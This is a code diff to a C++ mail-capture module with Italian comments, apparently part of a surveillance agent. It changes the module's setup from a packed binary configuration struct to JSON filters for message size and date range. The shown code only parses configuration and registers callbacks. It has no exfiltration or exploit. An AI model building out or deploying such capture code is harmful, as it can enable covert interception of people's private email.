@@ -1,15 +1,5 @@
 #include "HM_MailAgent/MailAgent.h"
 
-#pragma pack(4)
-typedef struct {
-	DWORD unused;			 // must be zero
-	FILETIME min_date;
-	FILETIME max_date;
-	DWORD max_size;
-	WCHAR search_string[1];  //DEVE essere necessariamente NULL terminata
-} mail_conf_struct;
-#pragma pack()
-
 #define MAIL_SLEEP_TIME 200000 //millisecondi 
 
 // Globals
@@ -77,29 +67,20 @@ DWORD __stdcall PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_MailCapInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_MailCapInit(JSONObject elem)
 {
-	mail_conf_struct *mail_conf_ptr = (mail_conf_struct *)conf_ptr;
+	JSONObject mail, filter;
+	FILETIME ftime;
 
-	if (conf_ptr) {
-		g_mail_filter.max_size = mail_conf_ptr->max_size;
-		g_mail_filter.min_date.dwHighDateTime = mail_conf_ptr->min_date.dwHighDateTime; 
-		g_mail_filter.min_date.dwLowDateTime = mail_conf_ptr->min_date.dwLowDateTime;
-		g_mail_filter.max_date.dwHighDateTime = mail_conf_ptr->max_date.dwHighDateTime; 
-		g_mail_filter.max_date.dwLowDateTime = mail_conf_ptr->max_date.dwLowDateTime;
-		_snwprintf_s(g_mail_filter.search_string, sizeof(g_mail_filter.search_string)/sizeof(WCHAR), _TRUNCATE, L"*%s*", mail_conf_ptr->search_string);				
-	} else {
-		// Di default non ha filtro per date ne' testuale ne' per size
-		g_mail_filter.max_size = 0xFFFFFFFF;
-		g_mail_filter.min_date.dwHighDateTime = 0; 
-		g_mail_filter.min_date.dwLowDateTime = 0;
-		g_mail_filter.max_date.dwHighDateTime = 0xFFFFFFFF; 
-		g_mail_filter.max_date.dwLowDateTime = 0xFFFFFFFF;
-		g_mail_filter.search_string[0] = L'*';
-		g_mail_filter.search_string[1] = 0;
-	}
+	mail = elem[L"mail"]->AsObject();
+	filter = elem[L"filter"]->AsObject();
+	g_mail_filter.max_size = (DWORD) filter[L"maxsize"]->AsNumber();
+	g_mail_filter.search_string[0] = L'*';
+	g_mail_filter.search_string[1] = 0;
+	
+	HM_TimeStringToFileTime(filter[L"datefrom"]->AsString().c_str(), &g_mail_filter.min_date);
+	HM_TimeStringToFileTime(filter[L"dateto"]->AsString().c_str(), &g_mail_filter.max_date);	
 
-	PM_MailCapStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
@@ -119,6 +100,5 @@ DWORD __stdcall PM_MailCapUnregister()
 
 void PM_MailCapRegister()
 {
-	AM_MonitorRegister(PM_MAILAGENT, NULL, (BYTE *)PM_MailCapStartStop, (BYTE *)PM_MailCapInit, (BYTE *)PM_MailCapUnregister);
-	PM_MailCapInit(NULL, FALSE);
+	AM_MonitorRegisterBSON(L"messages", PM_MAILAGENT, NULL, (BYTE *)PM_MailCapStartStop, (BYTE *)PM_MailCapInit, (BYTE *)PM_MailCapUnregister);
 }
